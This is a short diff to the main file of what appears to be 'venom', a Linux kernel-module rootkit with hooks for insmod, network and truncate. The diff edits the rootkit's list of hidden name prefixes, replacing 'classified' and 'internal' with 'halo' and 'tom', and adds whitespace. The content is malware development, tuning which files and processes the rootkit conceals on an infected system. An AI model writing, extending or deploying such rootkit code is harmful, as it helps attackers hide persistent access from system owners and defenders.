@@ -1,4 +1,4 @@
-#include <linux/init.h>
+#include <linux/init.h> 
 #include <linux/module.h>
 #include <linux/kernel.h>
 
@@ -16,6 +16,7 @@
 #include "hooks/insmod.h"
 #include "hooks/network.h"
 #include "hooks/truncate.h"
+
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Trevohack");
 MODULE_DESCRIPTION("Advance LKM");
@@ -30,8 +31,8 @@ MODULE_VERSION("4.0");
 
 static char *hidden_prefixes[MAX_HIDDEN_PREFIXES] = {
     "source-code",
-    "classified",
-    "internal",
+    "halo",
+    "tom",
     "venom",
     "trevohack",
     "hack",
@@ -136,4 +137,5 @@ notrace static void __exit venom_exit(void) {
 
 module_init(venom_init);
 module_exit(venom_exit); 
+
 
